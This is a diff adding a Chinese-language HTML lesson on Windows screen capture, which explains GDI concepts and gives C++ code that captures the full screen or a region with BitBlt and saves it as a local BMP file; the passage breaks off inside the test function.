@@ -1,0 +1,939 @@
+<h1 id="section-1">课时05 - 屏幕截屏</h1><h2 id="section-2">课程目标</h2><ol><li>理解Windows图形设备接口(GDI)</li><li>掌握屏幕截图技术实现</li><li>实现高效的屏幕捕获功能</li><li>了解图像格式转换和保存</li></ol><h2 id="section-3">名词解释</h2><table><thead><tr><th>术语</th><th>全称</th><th>解释</th></tr></thead><tbody><tr><td>GDI</td><td>Graphics Device Interface</td><td>Windows图形设备接口</td></tr><tr><td>BitBlt</td><td>Bit Block Transfer</td><td>位块传输</td></tr><tr><td>HDC</td><td>Handle to Device Context</td><td>设备上下文句柄</td></tr><tr><td>Bitmap</td><td>位图</td><td>图像数据结构</td></tr></tbody></table><h2 id="section-4">技术原理</h2><h3 id="section-5">1. Windows图形系统</h3><pre class="shiki github-dark" style="background-color:#24292e;color:#e1e4e8" tabindex="0"><code><span class="line"><span>Windows图形架构:</span></span>
+<span class="line"><span>┌─────────────────────────────────────┐</span></span>
+<span class="line"><span>│           应用程序                  │</span></span>
+<span class="line"><span>├─────────────────────────────────────┤</span></span>
+<span class="line"><span>│           GDI/GDI+                  │</span></span>
+<span class="line"><span>├─────────────────────────────────────┤</span></span>
+<span class="line"><span>│         Device Drivers              │</span></span>
+<span class="line"><span>├─────────────────────────────────────┤</span></span>
+<span class="line"><span>│         Graphics Hardware           │</span></span>
+<span class="line"><span>└─────────────────────────────────────┘</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>屏幕截图原理:</span></span>
+<span class="line"><span>1. 获取屏幕设备上下文(HDC)</span></span>
+<span class="line"><span>2. 创建兼容的内存设备上下文</span></span>
+<span class="line"><span>3. 创建位图对象</span></span>
+<span class="line"><span>4. 将屏幕内容复制到位图</span></span>
+<span class="line"><span>5. 保存位图数据</span></span>
+<span class="line"><span></span></span></code></pre><h3 id="section-6">2. 屏幕截图技术</h3><pre class="shiki github-dark" style="background-color:#24292e;color:#e1e4e8" tabindex="0"><code><span class="line"><span>主要API:</span></span>
+<span class="line"><span>GetDC()          - 获取设备上下文</span></span>
+<span class="line"><span>CreateCompatibleDC() - 创建兼容DC</span></span>
+<span class="line"><span>CreateCompatibleBitmap() - 创建兼容位图</span></span>
+<span class="line"><span>BitBlt()         - 位块传输</span></span>
+<span class="line"><span>GetDIBits()      - 获取位图数据</span></span>
+<span class="line"><span></span></span></code></pre><h2 id="section-7">代码实现</h2><h3 id="section-8">1. 基础屏幕截图实现</h3><pre class="shiki github-dark" style="background-color:#24292e;color:#e1e4e8" tabindex="0"><code><span class="line"><span style="color:#6A737D">// screen_capture.cpp</span></span>
+<span class="line"><span style="color:#6A737D">// 基础屏幕截图实现</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#F97583">#include</span><span style="color:#9ECBFF"> &#x3C;windows.h></span></span>
+<span class="line"><span style="color:#F97583">#include</span><span style="color:#9ECBFF"> &#x3C;stdio.h></span></span>
+<span class="line"><span style="color:#F97583">#include</span><span style="color:#9ECBFF"> &#x3C;string></span></span>
+<span class="line"><span style="color:#F97583">#include</span><span style="color:#9ECBFF"> &#x3C;vector></span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6A737D">// BMP文件头结构</span></span>
+<span class="line"><span style="color:#F97583">#pragma</span><span style="color:#B392F0"> pack</span><span style="color:#E1E4E8">(</span><span style="color:#B392F0">push</span><span style="color:#E1E4E8">, 1)</span></span>
+<span class="line"><span style="color:#F97583">typedef</span><span style="color:#F97583"> struct</span><span style="color:#E1E4E8"> {</span></span>
+<span class="line"><span style="color:#E1E4E8">    WORD    bfType;</span></span>
+<span class="line"><span style="color:#E1E4E8">    DWORD   bfSize;</span></span>
+<span class="line"><span style="color:#E1E4E8">    WORD    bfReserved1;</span></span>
+<span class="line"><span style="color:#E1E4E8">    WORD    bfReserved2;</span></span>
+<span class="line"><span style="color:#E1E4E8">    DWORD   bfOffBits;</span></span>
+<span class="line"><span style="color:#E1E4E8">} </span><span style="color:#B392F0">BITMAPFILEHEADER_COMPAT</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#F97583">#pragma</span><span style="color:#B392F0"> pack</span><span style="color:#E1E4E8">(</span><span style="color:#B392F0">pop</span><span style="color:#E1E4E8">)</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6A737D">// 屏幕截图类</span></span>
+<span class="line"><span style="color:#F97583">class</span><span style="color:#B392F0"> ScreenCapture</span><span style="color:#E1E4E8"> {</span></span>
+<span class="line"><span style="color:#F97583">public:</span></span>
+<span class="line"><span style="color:#6A737D">    // 截取全屏</span></span>
+<span class="line"><span style="color:#F97583">    static</span><span style="color:#F97583"> bool</span><span style="color:#B392F0"> CaptureScreen</span><span style="color:#E1E4E8">(</span><span style="color:#F97583">const</span><span style="color:#F97583"> char*</span><span style="color:#FFAB70"> filename</span><span style="color:#E1E4E8">) {</span></span>
+<span class="line"><span style="color:#6A737D">        // 获取屏幕尺寸</span></span>
+<span class="line"><span style="color:#F97583">        int</span><span style="color:#E1E4E8"> screenWidth </span><span style="color:#F97583">=</span><span style="color:#B392F0"> GetSystemMetrics</span><span style="color:#E1E4E8">(SM_CXSCREEN);</span></span>
+<span class="line"><span style="color:#F97583">        int</span><span style="color:#E1E4E8"> screenHeight </span><span style="color:#F97583">=</span><span style="color:#B392F0"> GetSystemMetrics</span><span style="color:#E1E4E8">(SM_CYSCREEN);</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#6A737D">        // 获取屏幕DC</span></span>
+<span class="line"><span style="color:#E1E4E8">        HDC hScreenDC </span><span style="color:#F97583">=</span><span style="color:#B392F0"> GetDC</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">NULL</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#F97583">        if</span><span style="color:#E1E4E8"> (</span><span style="color:#F97583">!</span><span style="color:#E1E4E8">hScreenDC) {</span></span>
+<span class="line"><span style="color:#B392F0">            printf</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"[-] Failed to get screen DC</span><span style="color:#79B8FF">\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#F97583">            return</span><span style="color:#79B8FF"> false</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">        }</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#6A737D">        // 创建兼容的内存DC</span></span>
+<span class="line"><span style="color:#E1E4E8">        HDC hMemoryDC </span><span style="color:#F97583">=</span><span style="color:#B392F0"> CreateCompatibleDC</span><span style="color:#E1E4E8">(hScreenDC);</span></span>
+<span class="line"><span style="color:#F97583">        if</span><span style="color:#E1E4E8"> (</span><span style="color:#F97583">!</span><span style="color:#E1E4E8">hMemoryDC) {</span></span>
+<span class="line"><span style="color:#B392F0">            ReleaseDC</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">NULL</span><span style="color:#E1E4E8">, hScreenDC);</span></span>
+<span class="line"><span style="color:#B392F0">            printf</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"[-] Failed to create memory DC</span><span style="color:#79B8FF">\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#F97583">            return</span><span style="color:#79B8FF"> false</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">        }</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#6A737D">        // 创建兼容位图</span></span>
+<span class="line"><span style="color:#E1E4E8">        HBITMAP hBitmap </span><span style="color:#F97583">=</span><span style="color:#B392F0"> CreateCompatibleBitmap</span><span style="color:#E1E4E8">(hScreenDC, screenWidth, screenHeight);</span></span>
+<span class="line"><span style="color:#F97583">        if</span><span style="color:#E1E4E8"> (</span><span style="color:#F97583">!</span><span style="color:#E1E4E8">hBitmap) {</span></span>
+<span class="line"><span style="color:#B392F0">            DeleteDC</span><span style="color:#E1E4E8">(hMemoryDC);</span></span>
+<span class="line"><span style="color:#B392F0">            ReleaseDC</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">NULL</span><span style="color:#E1E4E8">, hScreenDC);</span></span>
+<span class="line"><span style="color:#B392F0">            printf</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"[-] Failed to create bitmap</span><span style="color:#79B8FF">\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#F97583">            return</span><span style="color:#79B8FF"> false</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">        }</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#6A737D">        // 选择位图到内存DC</span></span>
+<span class="line"><span style="color:#E1E4E8">        HGDIOBJ hOldBitmap </span><span style="color:#F97583">=</span><span style="color:#B392F0"> SelectObject</span><span style="color:#E1E4E8">(hMemoryDC, hBitmap);</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#6A737D">        // 复制屏幕到内存DC</span></span>
+<span class="line"><span style="color:#F97583">        if</span><span style="color:#E1E4E8"> (</span><span style="color:#F97583">!</span><span style="color:#B392F0">BitBlt</span><span style="color:#E1E4E8">(hMemoryDC, </span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">, </span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">, screenWidth, screenHeight, </span></span>
+<span class="line"><span style="color:#E1E4E8">                   hScreenDC, </span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">, </span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">, SRCCOPY)) {</span></span>
+<span class="line"><span style="color:#B392F0">            printf</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"[-] BitBlt failed</span><span style="color:#79B8FF">\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#B392F0">            SelectObject</span><span style="color:#E1E4E8">(hMemoryDC, hOldBitmap);</span></span>
+<span class="line"><span style="color:#B392F0">            DeleteObject</span><span style="color:#E1E4E8">(hBitmap);</span></span>
+<span class="line"><span style="color:#B392F0">            DeleteDC</span><span style="color:#E1E4E8">(hMemoryDC);</span></span>
+<span class="line"><span style="color:#B392F0">            ReleaseDC</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">NULL</span><span style="color:#E1E4E8">, hScreenDC);</span></span>
+<span class="line"><span style="color:#F97583">            return</span><span style="color:#79B8FF"> false</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">        }</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#6A737D">        // 保存位图到文件</span></span>
+<span class="line"><span style="color:#F97583">        bool</span><span style="color:#E1E4E8"> result </span><span style="color:#F97583">=</span><span style="color:#B392F0"> SaveBitmapToFile</span><span style="color:#E1E4E8">(hBitmap, hMemoryDC, filename);</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#6A737D">        // 清理资源</span></span>
+<span class="line"><span style="color:#B392F0">        SelectObject</span><span style="color:#E1E4E8">(hMemoryDC, hOldBitmap);</span></span>
+<span class="line"><span style="color:#B392F0">        DeleteObject</span><span style="color:#E1E4E8">(hBitmap);</span></span>
+<span class="line"><span style="color:#B392F0">        DeleteDC</span><span style="color:#E1E4E8">(hMemoryDC);</span></span>
+<span class="line"><span style="color:#B392F0">        ReleaseDC</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">NULL</span><span style="color:#E1E4E8">, hScreenDC);</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#F97583">        return</span><span style="color:#E1E4E8"> result;</span></span>
+<span class="line"><span style="color:#E1E4E8">    }</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#6A737D">    // 截取指定区域</span></span>
+<span class="line"><span style="color:#F97583">    static</span><span style="color:#F97583"> bool</span><span style="color:#B392F0"> CaptureRegion</span><span style="color:#E1E4E8">(</span><span style="color:#F97583">int</span><span style="color:#FFAB70"> x</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">int</span><span style="color:#FFAB70"> y</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">int</span><span style="color:#FFAB70"> width</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">int</span><span style="color:#FFAB70"> height</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">const</span><span style="color:#F97583"> char*</span><span style="color:#FFAB70"> filename</span><span style="color:#E1E4E8">) {</span></span>
+<span class="line"><span style="color:#6A737D">        // 获取屏幕DC</span></span>
+<span class="line"><span style="color:#E1E4E8">        HDC hScreenDC </span><span style="color:#F97583">=</span><span style="color:#B392F0"> GetDC</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">NULL</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#F97583">        if</span><span style="color:#E1E4E8"> (</span><span style="color:#F97583">!</span><span style="color:#E1E4E8">hScreenDC) </span><span style="color:#F97583">return</span><span style="color:#79B8FF"> false</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#6A737D">        // 创建内存DC</span></span>
+<span class="line"><span style="color:#E1E4E8">        HDC hMemoryDC </span><span style="color:#F97583">=</span><span style="color:#B392F0"> CreateCompatibleDC</span><span style="color:#E1E4E8">(hScreenDC);</span></span>
+<span class="line"><span style="color:#F97583">        if</span><span style="color:#E1E4E8"> (</span><span style="color:#F97583">!</span><span style="color:#E1E4E8">hMemoryDC) {</span></span>
+<span class="line"><span style="color:#B392F0">            ReleaseDC</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">NULL</span><span style="color:#E1E4E8">, hScreenDC);</span></span>
+<span class="line"><span style="color:#F97583">            return</span><span style="color:#79B8FF"> false</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">        }</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#6A737D">        // 创建位图</span></span>
+<span class="line"><span style="color:#E1E4E8">        HBITMAP hBitmap </span><span style="color:#F97583">=</span><span style="color:#B392F0"> CreateCompatibleBitmap</span><span style="color:#E1E4E8">(hScreenDC, width, height);</span></span>
+<span class="line"><span style="color:#F97583">        if</span><span style="color:#E1E4E8"> (</span><span style="color:#F97583">!</span><span style="color:#E1E4E8">hBitmap) {</span></span>
+<span class="line"><span style="color:#B392F0">            DeleteDC</span><span style="color:#E1E4E8">(hMemoryDC);</span></span>
+<span class="line"><span style="color:#B392F0">            ReleaseDC</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">NULL</span><span style="color:#E1E4E8">, hScreenDC);</span></span>
+<span class="line"><span style="color:#F97583">            return</span><span style="color:#79B8FF"> false</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">        }</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#6A737D">        // 选择位图</span></span>
+<span class="line"><span style="color:#E1E4E8">        HGDIOBJ hOldBitmap </span><span style="color:#F97583">=</span><span style="color:#B392F0"> SelectObject</span><span style="color:#E1E4E8">(hMemoryDC, hBitmap);</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#6A737D">        // 复制指定区域</span></span>
+<span class="line"><span style="color:#F97583">        if</span><span style="color:#E1E4E8"> (</span><span style="color:#F97583">!</span><span style="color:#B392F0">BitBlt</span><span style="color:#E1E4E8">(hMemoryDC, </span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">, </span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">, width, height, </span></span>
+<span class="line"><span style="color:#E1E4E8">                   hScreenDC, x, y, SRCCOPY)) {</span></span>
+<span class="line"><span style="color:#B392F0">            SelectObject</span><span style="color:#E1E4E8">(hMemoryDC, hOldBitmap);</span></span>
+<span class="line"><span style="color:#B392F0">            DeleteObject</span><span style="color:#E1E4E8">(hBitmap);</span></span>
+<span class="line"><span style="color:#B392F0">            DeleteDC</span><span style="color:#E1E4E8">(hMemoryDC);</span></span>
+<span class="line"><span style="color:#B392F0">            ReleaseDC</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">NULL</span><span style="color:#E1E4E8">, hScreenDC);</span></span>
+<span class="line"><span style="color:#F97583">            return</span><span style="color:#79B8FF"> false</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">        }</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#6A737D">        // 保存位图</span></span>
+<span class="line"><span style="color:#F97583">        bool</span><span style="color:#E1E4E8"> result </span><span style="color:#F97583">=</span><span style="color:#B392F0"> SaveBitmapToFile</span><span style="color:#E1E4E8">(hBitmap, hMemoryDC, filename);</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#6A737D">        // 清理</span></span>
+<span class="line"><span style="color:#B392F0">        SelectObject</span><span style="color:#E1E4E8">(hMemoryDC, hOldBitmap);</span></span>
+<span class="line"><span style="color:#B392F0">        DeleteObject</span><span style="color:#E1E4E8">(hBitmap);</span></span>
+<span class="line"><span style="color:#B392F0">        DeleteDC</span><span style="color:#E1E4E8">(hMemoryDC);</span></span>
+<span class="line"><span style="color:#B392F0">        ReleaseDC</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">NULL</span><span style="color:#E1E4E8">, hScreenDC);</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#F97583">        return</span><span style="color:#E1E4E8"> result;</span></span>
+<span class="line"><span style="color:#E1E4E8">    }</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#F97583">private:</span></span>
+<span class="line"><span style="color:#6A737D">    // 保存位图为BMP文件</span></span>
+<span class="line"><span style="color:#F97583">    static</span><span style="color:#F97583"> bool</span><span style="color:#B392F0"> SaveBitmapToFile</span><span style="color:#E1E4E8">(</span><span style="color:#B392F0">HBITMAP</span><span style="color:#FFAB70"> hBitmap</span><span style="color:#E1E4E8">, </span><span style="color:#B392F0">HDC</span><span style="color:#FFAB70"> hDC</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">const</span><span style="color:#F97583"> char*</span><span style="color:#FFAB70"> filename</span><span style="color:#E1E4E8">) {</span></span>
+<span class="line"><span style="color:#6A737D">        // 获取位图信息</span></span>
+<span class="line"><span style="color:#E1E4E8">        BITMAP bmp;</span></span>
+<span class="line"><span style="color:#F97583">        if</span><span style="color:#E1E4E8"> (</span><span style="color:#F97583">!</span><span style="color:#B392F0">GetObject</span><span style="color:#E1E4E8">(hBitmap, </span><span style="color:#F97583">sizeof</span><span style="color:#E1E4E8">(BITMAP), </span><span style="color:#F97583">&#x26;</span><span style="color:#E1E4E8">bmp)) {</span></span>
+<span class="line"><span style="color:#F97583">            return</span><span style="color:#79B8FF"> false</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">        }</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#6A737D">        // 准备BITMAPINFO结构</span></span>
+<span class="line"><span style="color:#E1E4E8">        BITMAPINFOHEADER bi </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> {</span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">};</span></span>
+<span class="line"><span style="color:#E1E4E8">        bi.biSize </span><span style="color:#F97583">=</span><span style="color:#F97583"> sizeof</span><span style="color:#E1E4E8">(BITMAPINFOHEADER);</span></span>
+<span class="line"><span style="color:#E1E4E8">        bi.biWidth </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> bmp.bmWidth;</span></span>
+<span class="line"><span style="color:#E1E4E8">        bi.biHeight </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> bmp.bmHeight;</span></span>
+<span class="line"><span style="color:#E1E4E8">        bi.biPlanes </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> 1</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">        bi.biBitCount </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> 24</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">        bi.biCompression </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> BI_RGB;</span></span>
+<span class="line"><span style="color:#E1E4E8">        bi.biSizeImage </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> 0</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#6A737D">        // 计算行大小（4字节对齐）</span></span>
+<span class="line"><span style="color:#E1E4E8">        DWORD dwBmpSize </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> ((bmp.bmWidth </span><span style="color:#F97583">*</span><span style="color:#E1E4E8"> bi.biBitCount </span><span style="color:#F97583">+</span><span style="color:#79B8FF"> 31</span><span style="color:#E1E4E8">) </span><span style="color:#F97583">/</span><span style="color:#79B8FF"> 32</span><span style="color:#E1E4E8">) </span><span style="color:#F97583">*</span><span style="color:#79B8FF"> 4</span><span style="color:#F97583"> *</span><span style="color:#E1E4E8"> bmp.bmHeight;</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#6A737D">        // 分配内存存储位图数据</span></span>
+<span class="line"><span style="color:#B392F0">        std</span><span style="color:#E1E4E8">::vector</span><span style="color:#F97583">&#x3C;</span><span style="color:#E1E4E8">BYTE</span><span style="color:#F97583">></span><span style="color:#B392F0"> bmpData</span><span style="color:#E1E4E8">(dwBmpSize);</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#6A737D">        // 获取位图数据</span></span>
+<span class="line"><span style="color:#F97583">        if</span><span style="color:#E1E4E8"> (</span><span style="color:#F97583">!</span><span style="color:#B392F0">GetDIBits</span><span style="color:#E1E4E8">(hDC, hBitmap, </span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">, bmp.bmHeight, </span></span>
+<span class="line"><span style="color:#E1E4E8">                      bmpData.</span><span style="color:#B392F0">data</span><span style="color:#E1E4E8">(), (BITMAPINFO</span><span style="color:#F97583">*</span><span style="color:#E1E4E8">)</span><span style="color:#F97583">&#x26;</span><span style="color:#E1E4E8">bi, DIB_RGB_COLORS)) {</span></span>
+<span class="line"><span style="color:#F97583">            return</span><span style="color:#79B8FF"> false</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">        }</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#6A737D">        // 创建文件</span></span>
+<span class="line"><span style="color:#E1E4E8">        HANDLE hFile </span><span style="color:#F97583">=</span><span style="color:#B392F0"> CreateFileA</span><span style="color:#E1E4E8">(</span></span>
+<span class="line"><span style="color:#E1E4E8">            filename,</span></span>
+<span class="line"><span style="color:#E1E4E8">            GENERIC_WRITE,</span></span>
+<span class="line"><span style="color:#79B8FF">            0</span><span style="color:#E1E4E8">,</span></span>
+<span class="line"><span style="color:#79B8FF">            NULL</span><span style="color:#E1E4E8">,</span></span>
+<span class="line"><span style="color:#E1E4E8">            CREATE_ALWAYS,</span></span>
+<span class="line"><span style="color:#E1E4E8">            FILE_ATTRIBUTE_NORMAL,</span></span>
+<span class="line"><span style="color:#79B8FF">            NULL</span></span>
+<span class="line"><span style="color:#E1E4E8">        );</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#F97583">        if</span><span style="color:#E1E4E8"> (hFile </span><span style="color:#F97583">==</span><span style="color:#E1E4E8"> INVALID_HANDLE_VALUE) {</span></span>
+<span class="line"><span style="color:#F97583">            return</span><span style="color:#79B8FF"> false</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">        }</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#6A737D">        // 写入文件头</span></span>
+<span class="line"><span style="color:#E1E4E8">        BITMAPFILEHEADER_COMPAT bmfHeader </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> {</span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">};</span></span>
+<span class="line"><span style="color:#E1E4E8">        bmfHeader.bfType </span><span style="color:#F97583">=</span><span style="color:#F97583"> 0x</span><span style="color:#79B8FF">4D42</span><span style="color:#E1E4E8">;</span><span style="color:#6A737D"> // "BM"</span></span>
+<span class="line"><span style="color:#E1E4E8">        bmfHeader.bfSize </span><span style="color:#F97583">=</span><span style="color:#F97583"> sizeof</span><span style="color:#E1E4E8">(BITMAPFILEHEADER_COMPAT) </span><span style="color:#F97583">+</span><span style="color:#F97583"> sizeof</span><span style="color:#E1E4E8">(BITMAPINFOHEADER) </span><span style="color:#F97583">+</span><span style="color:#E1E4E8"> dwBmpSize;</span></span>
+<span class="line"><span style="color:#E1E4E8">        bmfHeader.bfOffBits </span><span style="color:#F97583">=</span><span style="color:#F97583"> sizeof</span><span style="color:#E1E4E8">(BITMAPFILEHEADER_COMPAT) </span><span style="color:#F97583">+</span><span style="color:#F97583"> sizeof</span><span style="color:#E1E4E8">(BITMAPINFOHEADER);</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#E1E4E8">        DWORD written;</span></span>
+<span class="line"><span style="color:#B392F0">        WriteFile</span><span style="color:#E1E4E8">(hFile, </span><span style="color:#F97583">&#x26;</span><span style="color:#E1E4E8">bmfHeader, </span><span style="color:#F97583">sizeof</span><span style="color:#E1E4E8">(BITMAPFILEHEADER_COMPAT), </span><span style="color:#F97583">&#x26;</span><span style="color:#E1E4E8">written, </span><span style="color:#79B8FF">NULL</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#B392F0">        WriteFile</span><span style="color:#E1E4E8">(hFile, </span><span style="color:#F97583">&#x26;</span><span style="color:#E1E4E8">bi, </span><span style="color:#F97583">sizeof</span><span style="color:#E1E4E8">(BITMAPINFOHEADER), </span><span style="color:#F97583">&#x26;</span><span style="color:#E1E4E8">written, </span><span style="color:#79B8FF">NULL</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#B392F0">        WriteFile</span><span style="color:#E1E4E8">(hFile, bmpData.</span><span style="color:#B392F0">data</span><span style="color:#E1E4E8">(), dwBmpSize, </span><span style="color:#F97583">&#x26;</span><span style="color:#E1E4E8">written, </span><span style="color:#79B8FF">NULL</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#B392F0">        CloseHandle</span><span style="color:#E1E4E8">(hFile);</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#B392F0">        printf</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"[+] Screenshot saved: </span><span style="color:#79B8FF">%s</span><span style="color:#9ECBFF"> (</span><span style="color:#79B8FF">%d</span><span style="color:#9ECBFF">x</span><span style="color:#79B8FF">%d</span><span style="color:#9ECBFF">)</span><span style="color:#79B8FF">\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">, filename, bmp.bmWidth, bmp.bmHeight);</span></span>
+<span class="line"><span style="color:#F97583">        return</span><span style="color:#79B8FF"> true</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">    }</span></span>
+<span class="line"><span style="color:#E1E4E8">};</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6A737D">// 测试函数</span></span>
+<span class="line"><span style="color:#F97583">void</span><span style="color:#B392F0"> TestScreenCapture</span><span style="color:#E1E4E8">() {</span></span>
+<span class="line"><span style="color:#B392F0">    printf</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"=== Screen Capture Test ===</span><span style="color:#79B8FF">\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#6A737D">    // 截取全屏</span></span>
+<span class="line"><span style="color:#F97583">    if</span><span style="color:#E1E4E8"> (</span><span style="color:#B392F0">ScreenCapture</span><span style="color:#E1E4E8">::</span><span style="color:#B392F0">CaptureScreen</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"screenshot_full.bmp"</span><span style="color:#E1E4E8">)) {</span></span>
+<span class="line"><span style="color:#B392F0">        printf</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"[+] Full screen captured</span><span style="color:#79B8FF">\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#E1E4E8">    }</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#6A737D">    // 截取指定区域</span></span>
+<span class="line"><span style="color:#F97583">    if</span><span style="color:#E1E4E8"> (</span><span style="color:#B392F0">ScreenCapture</span><span style="color:#E1E4E8">::</span><span style="color:#B392F0">CaptureRegion</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">100</span><span style="color:#E1E4E8">, </span><span style="color:#79B8FF">100</span><span style="color:#E1E4E8">, </span><span style="color:#79B8FF">800</span><span style="color:#E1E4E8">, </span><span style="color:#79B8FF">600</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">"screenshot_region.bmp"</span><span style="color:#E1E4E8">)) {</span></span>
